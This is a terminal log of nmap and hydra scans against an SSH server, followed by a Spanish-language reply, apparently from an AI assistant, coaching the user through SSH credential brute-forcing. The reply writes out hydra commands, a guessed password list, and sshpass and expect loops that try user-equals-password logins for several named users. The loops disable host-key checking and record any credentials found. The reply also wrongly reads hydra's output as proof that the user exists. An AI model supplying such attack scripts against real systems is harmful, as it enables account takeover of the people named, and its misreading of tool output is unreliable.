si03@attacker-3:~$ nmap -p 22 --script ssh-auth-methods 10.0.3.5 --script-args="ssh.user=lames"
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-13 12:03 UTC
Nmap scan report for 10.0.3.5
Host is up (0.00075s latency).

PORT   STATE SERVICE
22/tcp open  ssh
|_ssh-auth-methods: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
fsi03@attacker-3:~$ hydra -l lames -p "" -t 1 ssh://10.0.3.5 -v
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-13 12:03:16
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.0.3.5:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://lames@10.0.3.5:22
[INFO] Successful, password authentication is supported by ssh://10.0.3.5:22
[STATUS] attack finished for 10.0.3.5 (waiting for children to complete tests)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-13 12:03:16
fsi03@attacker-3:~$ 

----


¡Perfecto! La información CLAVE está aquí:

```
[INFO] Successful, password authentication is supported by ssh://10.0.3.5:22
```

**Eso significa:**
1. ✅ El usuario `lames` **EXISTE** en el sistema
2. ✅ El servidor SSH **acepta autenticación por contraseña**
3. ❌ La contraseña vacía (`""`) no funcionó (obviamente)

## Ahora prueba la hipótesis: "la contraseña es igual al nombre de usuario"

```bash
# Probar lames con contraseña "lames"
hydra -l lames -p lames ssh://10.0.3.5 -t 1 -f -v
```

## Si eso falla, prueba otras variaciones comunes:

```bash
# Crear un archivo con posibles contraseñas para lames
cat > lames_passwords.txt << 'EOF'
lames
Lames
LAMES
lame
l4m3s
lames123
123lames
lames2024
password
lameslames
EOF

# Probar todas
hydra -l lames -P lames_passwords.txt ssh://10.0.3.5 -t 1 -v
```

## Pero también prueba OTROS usuarios que podrían tener user=pass

```bash
# Probar varios usuarios con su mismo nombre como password
# Basado en los emails que viste: eaosta, racosta, jadrover, daguirre, gaguirre, games, etc.

cat > test_users.txt << 'EOF'
eaosta
racosta
jadrover
daguirre
gaguirre
games
ames
lames
EOF

# Ataque: cada usuario probado contra su misma password
# Hydra no puede hacer esto directamente (necesita archivos separados)
# Así que usamos un bucle:
for user in $(cat test_users.txt); do
    echo "Probando $user : $user"
    timeout 3 sshpass -p "$user" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no "$user@10.0.3.5" "echo OK" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "¡ENCONTRADO! $user : $user"
        echo "$user:$user" >> credenciales_encontradas.txt
    fi
done
```

## Si no tienes sshpass en attacker-3:

```bash
# Instalarlo (puede que necesites sudo)
sudo apt install sshpass -y

# O usar expect (ya debería estar)
for user in eaosta racosta jadrover daguirre gaguirre games ames lames; do
    echo "Probando $user"
    expect -c "
    spawn ssh -o StrictHostKeyChecking=no $user@10.0.3.5
    expect \"password:\" { send \"$user\r\" }
    expect {
        \"$\" { puts \"OK\"; exit 0 }
        \"#\" { puts \"OK\"; exit 0 }
        \"Permission denied\" { exit 1 }
    }
    " && echo ">>> ¡FUNCIONÓ! $user:$user"
done
```

## ¡Haz esto AHORA!

```bash
# La prueba más simple y directa
ssh lames@10.0.3.5
# Cuando pida contraseña, escribe "lames" (sin comillas)
```

**¿Qué pasa cuando ejecutas `ssh lames@10.0.3.5` y pones "lames" como contraseña?**
- ¿Entras al sistema?
- ¿Te dice "Permission denied"?
- ¿Otro mensaje?

Esa respuesta nos dirá el siguiente paso.



while read user; do
    user=$(echo "$user" | xargs)
    while read pass; do
        echo "$user:$pass" >> combinaciones_espanol_2.txt
    done < combinaciones_espanol.txt
done < ../usuarios.txt